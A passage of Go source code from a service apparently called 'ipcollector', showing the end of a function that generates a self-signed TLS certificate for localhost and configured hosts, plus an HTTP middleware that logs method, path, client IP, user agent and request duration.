		Subject:               pkix.Name{CommonName: "ipcollector"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{"localhost"},
		IPAddresses:           []net.IP{net.IPv4(127, 0, 0, 1), net.ParseIP("::1")},
	}
	for _, h := range cfg.TLSHosts {
		h = strings.TrimSpace(h)
		if h == "" {
			continue
		}
		if ip := net.ParseIP(h); ip != nil {
			tmpl.IPAddresses = append(tmpl.IPAddresses, ip)
		} else {
			tmpl.DNSNames = append(tmpl.DNSNames, h)
		}
	}
	if ip := cfg.ServerIP; ip != nil {
		tmpl.IPAddresses = append(tmpl.IPAddresses, ip)
	}
	der, err := x509.CreateCertificate(cryptorand.Reader, &tmpl, &tmpl, &key.PublicKey, key)
	if err != nil {
		return nil, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, err
	}
	return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}, nil
}

func logMiddleware(h http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		h.ServeHTTP(w, r)
		log.Printf("%s %s %s %s %s", r.Method, r.URL.Path, clientIP(r), r.UserAgent(), time.Since(start))
	})
}
